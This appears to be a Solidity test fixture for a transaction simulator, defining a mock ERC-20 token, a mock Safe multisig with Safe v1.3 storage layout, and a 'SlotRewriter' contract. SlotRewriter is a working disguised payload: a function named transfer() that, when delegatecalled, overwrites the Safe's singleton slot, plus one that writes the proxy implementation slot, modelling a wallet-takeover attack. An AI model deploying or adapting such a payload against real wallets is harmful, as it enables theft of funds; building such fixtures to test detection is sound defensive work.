// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// Minimal ERC-20 used only by the live simulator tests.
contract MockToken {
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory symbol_, uint8 decimals_) {
        symbol = symbol_;
        decimals = decimals_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
}

/// Storage layout mirrors Safe v1.3: slot 0 singleton, slot 4 threshold.
contract MockSafe {
    address internal singleton;                      // slot 0
    mapping(address => address) internal modules;    // slot 1
    mapping(address => address) internal owners;     // slot 2
    uint256 internal ownerCount;                     // slot 3
    uint256 internal threshold;                      // slot 4

    event ChangedThreshold(uint256 threshold);
    event AddedOwner(address owner);

    constructor(address singleton_, uint256 threshold_) {
        singleton = singleton_;
        threshold = threshold_;
    }

    modifier authorized() {
        require(msg.sender == address(this), "GS031");
        _;
    }

    function changeThreshold(uint256 t) external authorized {
        threshold = t;
        emit ChangedThreshold(t);
    }

    function addOwnerWithThreshold(address owner, uint256 t) external authorized {
        owners[owner] = owner;
        ownerCount += 1;
        emit AddedOwner(owner);
        threshold = t;
        emit ChangedThreshold(t);
    }

    function getThreshold() external view returns (uint256) {
        return threshold;
    }

    receive() external payable {}
}

/// Bybit-style payload: looks like transfer(), actually rewrites slot 0 when delegatecalled.
contract SlotRewriter {
    function transfer(address newSingleton, uint256) external {
        assembly {
            sstore(0, newSingleton)
        }
    }

    /// Writes the ERC-1967 implementation slot, which starts empty.
    function upgrade(address impl) external {
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        assembly {
            sstore(slot, impl)
        }
    }
}
